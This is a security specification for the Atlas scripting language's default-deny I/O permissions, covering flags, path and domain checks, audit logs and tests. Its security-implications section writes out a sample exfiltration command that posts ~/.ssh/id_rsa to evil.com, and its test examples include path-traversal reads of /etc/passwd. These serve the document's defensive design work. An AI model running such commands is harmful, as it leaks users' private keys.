# Atlas I/O Security Model

**Version:** 1.0
**Status:** Specification
**Last Updated:** 2026-02-12

---

## Overview

Atlas follows a **secure-by-default** model for all I/O operations. All file system, network, and process operations are **denied by default** and require explicit opt-in via runtime flags. This document defines the security boundaries, threat model, and permission system for Atlas's I/O capabilities.

**Design Principles:**
- **Default Deny:** All dangerous operations blocked unless explicitly allowed
- **Explicit Permissions:** Users must consciously opt-in to I/O capabilities
- **Granular Control:** Fine-grained permissions (not all-or-nothing)
- **Auditable:** Clear visibility into what permissions are granted
- **Fail-Safe:** Permission failures produce clear error messages

---

## Threat Model

### Assumptions

**Trusted:**
- Atlas runtime implementation (VM, interpreter, compiler)
- Host operating system and file system
- User who runs Atlas programs

**Untrusted:**
- Atlas source code (user scripts, third-party libraries)
- External inputs (CLI args, environment variables, stdin)
- Network responses
- File system contents (except Atlas runtime itself)

### Attack Vectors

**Without I/O Security:**
1. **Data Exfiltration:** Malicious script reads sensitive files (`~/.ssh/id_rsa`, `.env`) and uploads to attacker server
2. **Data Destruction:** Script deletes critical files or overwrites system files
3. **Privilege Escalation:** Script executes system commands to gain elevated privileges
4. **Network Attacks:** Script sends spam, participates in DDoS, or scans network
5. **Supply Chain:** Third-party library includes hidden malicious I/O operations
6. **Path Traversal:** Script uses `../` to escape intended directory restrictions

**With I/O Security:**
- All attacks above are **blocked by default**
- Attacks only possible if user explicitly grants dangerous permissions
- Permission prompts make malicious intent obvious

---

## Permission System

### Permission Flags

Atlas uses CLI flags to grant I/O permissions at runtime. All permissions default to **DENY**.

#### File System Permissions

**`--allow-read[=<path>]`**
- **Default:** DENY all file reads
- **Without path:** Allow read access to entire file system
- **With path:** Allow read access only to specified path (and subdirectories)
- **Multiple paths:** Repeat flag for each path: `--allow-read=/tmp --allow-read=/home/user/data`

**`--allow-write[=<path>]`**
- **Default:** DENY all file writes, creates, deletes
- **Without path:** Allow write access to entire file system
- **With path:** Allow write access only to specified path (and subdirectories)
- **Multiple paths:** Repeat flag for each path

**Examples:**
```bash
# Deny all file access (default)
atlas run script.atl

# Allow reading any file
atlas run script.atl --allow-read

# Allow reading only from /tmp
atlas run script.atl --allow-read=/tmp

# Allow reading from /data and writing to /output
atlas run script.atl --allow-read=/data --allow-write=/output
```

#### Network Permissions

**`--allow-net[=<domain>]`**
- **Default:** DENY all network access (HTTP, HTTPS, TCP, UDP)
- **Without domain:** Allow network access to any host
- **With domain:** Allow network access only to specified domain
- **Multiple domains:** Repeat flag for each domain: `--allow-net=api.example.com --allow-net=cdn.example.com`

**Examples:**
```bash
# Deny all network access (default)
atlas run script.atl

# Allow network access to any host
atlas run script.atl --allow-net

# Allow network access only to api.github.com
atlas run script.atl --allow-net=api.github.com

# Allow access to multiple domains
atlas run script.atl --allow-net=api.github.com --allow-net=raw.githubusercontent.com
```

#### Process Execution Permissions

**`--allow-run[=<program>]`**
- **Default:** DENY all subprocess execution
- **Without program:** Allow execution of any program
- **With program:** Allow execution only of specified program (exact name match)
- **Multiple programs:** Repeat flag for each program

**Examples:**
```bash
# Deny all subprocess execution (default)
atlas run script.atl

# Allow execution of any program
atlas run script.atl --allow-run

# Allow execution only of git
atlas run script.atl --allow-run=git

# Allow execution of git and npm
atlas run script.atl --allow-run=git --allow-run=npm
```

#### Environment Variable Permissions

**`--allow-env[=<var>]`**
- **Default:** DENY all environment variable access
- **Without var:** Allow reading any environment variable
- **With var:** Allow reading only specified environment variable
- **Multiple vars:** Repeat flag for each variable

**Examples:**
```bash
# Deny all environment variable access (default)
atlas run script.atl

# Allow reading any environment variable
atlas run script.atl --allow-env

# Allow reading only PATH
atlas run script.atl --allow-env=PATH

# Allow reading PATH and HOME
atlas run script.atl --allow-env=PATH --allow-env=HOME
```

#### All Permissions (Development Mode)

**`--allow-all`**
- **Equivalent to:** `--allow-read --allow-write --allow-net --allow-run --allow-env`
- **Use case:** Development and testing (NEVER for production or untrusted code)
- **Warning:** Script will emit warning on startup: `⚠️  Running with --allow-all grants unrestricted access`

---

## Permission Enforcement

### Runtime Checks

**When I/O function is called:**
1. **Check permission:** Does current permission set allow this operation?
2. **Check path/domain/program:** If granular permission, does target match allowlist?
3. **If denied:** Raise runtime error `AT0300` (PermissionDenied)
4. **If allowed:** Proceed with operation

### Error Messages

**Permission Denied (AT0300):**
```
error[AT0300]: Permission denied: file read access
  --> script.atl:5:10
   |
 5 | let data = file::read("/etc/passwd");
   |            ^^^^^^^^^^^^^^^^^^^^^^^^^ reading "/etc/passwd" requires --allow-read
   |
   = help: Run with `--allow-read=/etc/passwd` or `--allow-read` to allow file reads
```

**Domain Not Allowed (AT0301):**
```
error[AT0301]: Permission denied: network access to "evil.com"
  --> script.atl:8:12
   |
 8 | let res = http::get("https://evil.com/api");
   |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ network access to "evil.com" requires --allow-net
   |
   = help: Run with `--allow-net=evil.com` or `--allow-net` to allow network access
```

---

## Path Validation

### Allowed Path Behavior

**Paths are normalized before checking:**
- Relative paths resolved to absolute paths (relative to CWD)
- Symlinks resolved to target path
- `.` and `..` components resolved
- Trailing slashes removed

**Subdirectory Access:**
- Allowing `/home/user/data` also allows `/home/user/data/subdir/file.txt`
- Does NOT allow `/home/user/data-backup/file.txt` (exact prefix match)

**Path Traversal Protection:**
```bash
# Allow read access to /tmp
atlas run script.atl --allow-read=/tmp

# Allowed:
file::read("/tmp/data.txt")          ✅
file::read("/tmp/subdir/data.txt")   ✅

# Denied (path traversal attempts):
file::read("/tmp/../etc/passwd")     ❌  (resolves to /etc/passwd)
file::read("/etc/passwd")            ❌
file::read("/tmp-backup/data.txt")   ❌  (not a subdirectory)
```

### Cross-Platform Path Handling

**Unix Paths:**
- `/home/user/data` → allowed
- `/home/user/data/file.txt` → allowed (subdirectory)

**Windows Paths:**
- `C:\Users\Alice\data` → allowed
- `C:\Users\Alice\data\file.txt` → allowed (subdirectory)
- `\\?\C:\Users\Alice\data` → normalized to `C:\Users\Alice\data`

**Relative Paths:**
- `./data` → resolved to absolute path before checking
- `../secrets` → resolved to absolute path before checking

---

## Domain Validation

### Domain Matching Rules

**Exact Match:**
- `--allow-net=api.github.com` allows `api.github.com` only
- Does NOT allow `github.com` or `raw.githubusercontent.com`

**Wildcard Not Supported (v0.1-v1.0):**
- `--allow-net=*.github.com` is treated as literal `*.github.com` (not a wildcard)
- To allow multiple subdomains, repeat flag:
  ```bash
  --allow-net=api.github.com --allow-net=raw.githubusercontent.com
  ```

**Port Handling:**
- `--allow-net=api.example.com` allows any port (`:80`, `:443`, `:8080`, etc.)
- Explicit port: `--allow-net=api.example.com:8080` allows only port 8080

**Protocol Agnostic:**
- `--allow-net=example.com` allows both `http://example.com` and `https://example.com`
- No distinction between HTTP and HTTPS in permission system

### URL Validation

**Before network request:**
1. Parse URL to extract domain and port
2. Normalize domain (lowercase, remove trailing `.`)
3. Check if domain matches any `--allow-net` entry
4. If no match, raise `AT0301` (PermissionDenied: network access)

**Examples:**
```bash
# Allow api.github.com
atlas run script.atl --allow-net=api.github.com

# Allowed:
http::get("https://api.github.com/users")       ✅
http::get("http://api.github.com/repos")        ✅
http::get("https://api.github.com:443/issues")  ✅

# Denied:
http::get("https://github.com")                 ❌  (different domain)
http::get("https://raw.githubusercontent.com")  ❌  (different domain)
```

---

## Program Execution Validation

### Program Matching Rules

**Exact Name Match:**
- `--allow-run=git` allows executing `git` only
- Does NOT allow `git-lfs`, `gitk`, or `/usr/bin/git`

**Path Resolution:**
- Program name is resolved via `PATH` environment variable
- Full path is NOT required: `git` matches `/usr/bin/git` or `C:\Program Files\Git\bin\git.exe`
- Explicit paths NOT allowed: `--allow-run=/usr/bin/git` is treated as program name `/usr/bin/git` (not a path)

**Arguments Not Checked:**
- `--allow-run=git` allows `git clone`, `git push`, etc.
- Flags are NOT part of permission check (only program name)
- To restrict arguments, use separate wrapper script

**Platform Differences:**
- Unix: `--allow-run=ls` allows `/bin/ls`, `/usr/bin/ls`, etc.
- Windows: `--allow-run=dir` allows `C:\Windows\System32\cmd.exe /c dir`

### Security Implications

**Unrestricted Arguments:**
- Allowing `git` also allows `git clone https://evil.com/malware.git`
- Allowing `curl` also allows `curl https://evil.com/exfiltrate -d @~/.ssh/id_rsa`
- **Mitigation:** Only allow programs you fully trust with any arguments

**Shell Injection:**
- Atlas does NOT invoke shell by default (no `sh -c` or `cmd /c`)
- Arguments passed directly to program (no shell expansion)
- **Safe:** `process::exec("ls", ["-la", "/tmp"])`
- **Safe:** `process::exec("git", ["clone", user_input])`

---

## Audit Logging

### Logging Policy

**What Gets Logged:**
- All I/O permission checks (allowed and denied)
- File paths, domains, programs accessed
- Timestamp and script location (file:line)

**What Does NOT Get Logged:**
- File contents (only paths)
- Network payloads (only URLs)
- Environment variable values (only names)

**Log Format:**
```
[2026-02-12T10:30:15Z] ALLOW read /tmp/data.txt (script.atl:5)
[2026-02-12T10:30:16Z] DENY write /etc/passwd (script.atl:8)
[2026-02-12T10:30:17Z] ALLOW net https://api.github.com (script.atl:12)
```

### Enabling Audit Logs

**`--audit-log[=<path>]`**
- **Default:** No audit logging
- **Without path:** Log to stderr
- **With path:** Log to specified file (append mode)

**Examples:**
```bash
# No audit logging (default)
atlas run script.atl

# Log to stderr
atlas run script.atl --audit-log

# Log to file
atlas run script.atl --audit-log=/var/log/atlas-audit.log
```

---

## Permission Prompts (Future)

**v1.1+ Feature:** Interactive permission prompts (similar to Deno's `--prompt` flag)

**Behavior:**
- If I/O operation attempted without permission, prompt user:
  ```
  ⚠️  script.atl wants to read "/home/user/secrets.txt"
  Allow? [y/n/always]
  ```
- User can grant once (`y`), deny (`n`), or grant permanently (`always`)
- Permanent grants stored in `~/.atlas/permissions.json`

**Not Implemented in v0.1-v1.0:**
- All permissions must be granted via CLI flags
- No interactive prompts
- No persistent permission storage

---

## Security Best Practices

### For Script Authors

**1. Principle of Least Privilege:**
- Request only the permissions your script needs
- Prefer granular permissions over broad permissions
- Document required permissions in README

**Example:**
```bash
# ❌ Bad: Requests unnecessary permissions
atlas run backup.atl --allow-all

# ✅ Good: Requests only what's needed
atlas run backup.atl --allow-read=/data --allow-write=/backups
```

**2. Validate Inputs:**
- Never trust user input for file paths or URLs
- Sanitize paths before passing to file I/O functions
- Validate domains before making network requests

**3. Error Handling:**
- Catch permission errors gracefully
- Provide clear error messages to users
- Don't swallow permission denied errors

**4. Document Permissions:**
```atlas
// backup.atl
// Required permissions:
//   --allow-read=/data        (read source files)
//   --allow-write=/backups    (write backup archives)

import file;

let data = file::read("/data/config.json");
file::write("/backups/config.backup.json", data);
```

### For Script Users

**1. Review Permissions:**
- Always read script documentation before granting permissions
- Audit what permissions are requested and why
- Be suspicious of scripts requesting `--allow-all`

**2. Use Granular Permissions:**
```bash
# ❌ Bad: Grants unnecessary access
atlas run untrusted.atl --allow-all

# ✅ Good: Grants only documented permissions
atlas run untrusted.atl --allow-read=/public-data
```

**3. Audit Third-Party Scripts:**
- Read source code before running
- Check for unexpected I/O operations
- Use `--audit-log` to monitor I/O access

**4. Use Sandboxing for Untrusted Code:**
```bash
# Run untrusted script with minimal permissions
atlas run untrusted.atl --allow-read=/tmp/sandbox --allow-write=/tmp/sandbox

# Monitor all I/O attempts
atlas run untrusted.atl --audit-log=/var/log/atlas-audit.log
```

---

## Implementation Requirements

### Runtime Checks (Required for v0.5)

**On every I/O stdlib call:**
```rust
// Pseudocode
fn file_read(path: &str) -> Result<String, RuntimeError> {
    // 1. Normalize path
    let normalized = normalize_path(path)?;

    // 2. Check permission
    if !permissions.allows_read(&normalized) {
        return Err(RuntimeError::PermissionDenied {
            code: "AT0300",
            operation: "read",
            target: normalized,
            suggestion: format!("--allow-read={}", normalized),
        });
    }

    // 3. Perform operation
    std::fs::read_to_string(&normalized)
        .map_err(|e| RuntimeError::IoError { ... })
}
```

### Error Codes

**New Diagnostic Codes:**
- `AT0300` - PermissionDenied: general permission error
- `AT0301` - PermissionDenied: network access
- `AT0302` - PermissionDenied: file read
- `AT0303` - PermissionDenied: file write
- `AT0304` - PermissionDenied: process execution
- `AT0305` - PermissionDenied: environment variable access

**Error Format:**
```rust
pub struct PermissionDeniedError {
    pub code: &'static str,        // "AT0300"
    pub operation: String,          // "read", "write", "net", etc.
    pub target: String,             // path, domain, program name
    pub suggestion: String,         // CLI flag to allow operation
    pub span: Span,                 // source location of I/O call
}
```

### CLI Flag Parsing

**Flags Support:**
- Single flag: `--allow-read`
- Flag with value: `--allow-read=/tmp`
- Multiple flags: `--allow-read=/tmp --allow-read=/data`
- Combined flags: `--allow-read --allow-write --allow-net`

**Parsing Rules:**
- Flags apply to entire script execution (not per-file)
- Flags inherited by REPL session
- Flags validated before script execution

### Permission Storage

**Runtime Permission Set:**
```rust
pub struct Permissions {
    pub read_allowlist: Option<Vec<PathBuf>>,   // None = deny, Some([]) = allow all
    pub write_allowlist: Option<Vec<PathBuf>>,  // None = deny, Some([]) = allow all
    pub net_allowlist: Option<Vec<String>>,     // None = deny, Some([]) = allow all
    pub run_allowlist: Option<Vec<String>>,     // None = deny, Some([]) = allow all
    pub env_allowlist: Option<Vec<String>>,     // None = deny, Some([]) = allow all
}
```

**Permission Propagation:**
- Permissions passed to interpreter/VM at initialization
- Permissions checked on every I/O stdlib call
- No runtime permission modification (immutable after startup)

---

## Testing Requirements

### Permission Tests (Required for v0.5)

**1. Default Deny Tests:**
```rust
#[rstest]
#[case("file::read(\"/tmp/data.txt\")", "AT0302")]
#[case("file::write(\"/tmp/out.txt\", \"data\")", "AT0303")]
#[case("http::get(\"https://example.com\")", "AT0301")]
#[case("process::exec(\"ls\", [\"-la\"])", "AT0304")]
fn test_io_denied_by_default(#[case] code: &str, #[case] error_code: &str) {
    let result = eval_with_permissions(code, Permissions::default());
    assert!(result.is_err());
    assert_eq!(result.unwrap_err().code, error_code);
}
```

**2. Allow Flag Tests:**
```rust
#[rstest]
#[case("file::read(\"/tmp/data.txt\")", "--allow-read=/tmp")]
#[case("file::write(\"/tmp/out.txt\", \"data\")", "--allow-write=/tmp")]
#[case("http::get(\"https://example.com\")", "--allow-net=example.com")]
fn test_io_allowed_with_flag(#[case] code: &str, #[case] flag: &str) {
    let perms = parse_permissions(&[flag]);
    let result = eval_with_permissions(code, perms);
    assert!(result.is_ok());
}
```

**3. Path Traversal Tests:**
```rust
#[test]
fn test_path_traversal_blocked() {
    let perms = parse_permissions(&["--allow-read=/tmp"]);

    // Should be blocked (escapes /tmp)
    let result = eval_with_permissions(
        "file::read(\"/tmp/../etc/passwd\")",
        perms.clone(),
    );
    assert!(result.is_err());
    assert_eq!(result.unwrap_err().code, "AT0302");
}
```

**4. Audit Log Tests:**
```rust
#[test]
fn test_audit_logging() {
    let log_path = "/tmp/atlas-audit.log";
    run_with_flags(
        "file::read(\"/tmp/data.txt\")",
        &["--allow-read=/tmp", &format!("--audit-log={}", log_path)],
    );

    let log = std::fs::read_to_string(log_path).unwrap();
    assert!(log.contains("ALLOW read /tmp/data.txt"));
}
```

---

## Migration Path

### v0.1-v0.4 (No I/O)
- No I/O stdlib functions exist
- No permission system needed
- Security model documented but not implemented

### v0.5 (File I/O + JSON)
- File I/O functions added (`file::read`, `file::write`, etc.)
- Permission system implemented (`--allow-read`, `--allow-write`)
- Audit logging supported (`--audit-log`)
- JSON parsing added (no security implications)

### v1.0 (Network + Process)
- Network functions added (`http::get`, `http::post`)
- Process execution added (`process::exec`)
- Additional permission flags (`--allow-net`, `--allow-run`, `--allow-env`)
- Permission prompts may be added (interactive mode)

### v1.1+ (Advanced)
- Permission prompts (interactive allow/deny)
- Persistent permission storage (`~/.atlas/permissions.json`)
- Wildcard domain matching (`*.github.com`)
- Time-limited permissions (expire after N hours)

---

## Comparison with Other Languages

### Deno
**Similarities:**
- Default deny for all I/O operations
- Granular CLI permission flags
- Path-based and domain-based allowlists

**Differences:**
- Atlas does not support `--prompt` (interactive prompts) in v0.1-v1.0
- Atlas uses simpler flag names (`--allow-read` vs `--allow-read`)
- Atlas does not support `--allow-hrtime` (high-resolution time)

### Node.js
**Differences:**
- Node.js has NO permission system (full system access by default)
- Atlas requires explicit opt-in for ALL I/O operations
- Atlas is secure-by-default, Node.js is permissive-by-default

### Python
**Differences:**
- Python has NO permission system (full system access by default)
- Atlas prevents accidental misuse of I/O operations
- Atlas is designed for untrusted code execution (AI-generated scripts)

---

## Rationale

### Why Default Deny?

**1. AI-Generated Code:**
- AI agents may generate code with unintended I/O operations
- Users should consciously approve I/O access
- Prevents accidental data leaks or file corruption

**2. Third-Party Libraries:**
- Libraries may include malicious or poorly written I/O code
- Users should audit what libraries can access
- Supply chain attacks mitigated by permission boundaries

**3. Scriptability:**
- Atlas scripts are often one-off automation tasks
- Scripts should not have unlimited system access
- Permissions make scripts' capabilities explicit

**4. Education:**
- Forces developers to think about security implications
- Makes I/O operations visible and intentional
- Encourages principle of least privilege

### Why Not Sandboxing?

**Considered but rejected:**
- Full OS-level sandboxing (chroot, containers, VMs)
- Language-level capability systems (object capabilities)

**Rationale:**
- Permission flags are simpler to understand and use
- Sandboxing adds complexity (platform-specific, hard to configure)
- Atlas targets scripting use cases, not adversarial environments
- Permission model is "good enough" for 95% of use cases

---

## Summary

**Atlas I/O Security Model:**
1. ✅ **Default Deny** - All I/O blocked unless explicitly allowed
2. ✅ **Granular Permissions** - Fine-grained control via CLI flags
3. ✅ **Path/Domain Validation** - Allowlists prevent traversal attacks
4. ✅ **Clear Error Messages** - Users know why access was denied
5. ✅ **Audit Logging** - Optional logging of all I/O operations
6. ✅ **Platform Agnostic** - Works the same on Windows, macOS, Linux

**Implementation Timeline:**
- **v0.1-v0.4:** Documentation only (no I/O functions)
- **v0.5:** File I/O with permission system
- **v1.0:** Network and process permissions
- **v1.1+:** Interactive prompts and persistent permissions

**Next Steps:**
- ✅ Security model documented (this file)
- ⬜ Implement `Permissions` struct in `atlas-runtime`
- ⬜ Add CLI flag parsing in `atlas-cli`
- ⬜ Add permission checks to file I/O stdlib functions
- ⬜ Write comprehensive permission tests

---

**References:**
- `docs/stdlib-expansion-plan.md` - Stdlib roadmap
- `docs/stdlib.md` - Current stdlib functions
- `Atlas-SPEC.md` - Language specification
- Deno Permissions: https://deno.land/manual/basics/permissions
- OWASP Security Guidelines: https://owasp.org/www-project-top-ten/
